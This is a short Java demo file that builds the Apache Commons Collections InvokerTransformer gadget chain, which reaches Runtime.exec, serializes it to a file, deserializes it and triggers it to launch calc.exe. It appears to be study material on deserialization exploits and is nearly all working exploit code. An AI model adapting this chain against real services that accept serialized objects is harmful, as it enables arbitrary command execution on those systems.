package demo.makeChain;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class Demo5 {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);

        //序列化
        FileOutputStream file = new FileOutputStream("chenlvtang.bin");
        ObjectOutputStream se = new ObjectOutputStream(file);
        se.writeObject(chain);
        se.close();
        //反序列化
        FileInputStream file1 = new FileInputStream("chenlvtang.bin");
        ObjectInputStream unse = new ObjectInputStream(file1);
        ChainedTransformer serverRead =  (ChainedTransformer) unse.readObject();
        unse.close();

        serverRead.transform("foobar");
    }
}
